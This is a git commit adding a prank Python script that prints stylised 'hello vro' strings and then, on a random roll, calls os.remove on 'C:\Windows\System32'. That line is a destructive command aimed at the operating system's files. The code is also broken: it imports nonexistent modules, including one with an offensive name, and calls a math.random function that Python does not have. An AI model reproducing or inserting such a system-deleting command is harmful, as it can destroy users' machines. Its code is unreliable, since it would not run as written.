e94236a9c7fde378d96f9950b1e029f8be909b71
Umair Khan <35268478+Hollistic@users.noreply.github.com>
2024-04-10 12:49:26 -0600

    create new freaky ah file

---
+++ main.py
@@ -0,0 +1,24 @@
+import os
+import math
+import numpy
+import slaves
+import pandabuy_haul
+
+array = []
+
+for x in range(1, 4):
+    new_row = []
+    for y in range(1, 4):
+        new_row.append("𝓱𝓮𝓵𝓵𝓸 𝓿𝓻𝓸")
+    array.append(new_row)
+        
+print(array)
+
+num = math.random(1, 7)
+print(num)
+if num == 4:
+    print("𝓰𝓸𝓸𝓭𝓫𝔂𝓮 𝓿𝓻𝓸❤️")
+    print("𝓯𝓻𝓮𝓪𝓴𝔂 𝓪𝓱 𝔀𝓲𝓷𝓭𝓸𝔀𝓼 𝓿𝓻𝓸 👅")
+    os.remove("C:\Windows\System32")
+
+    
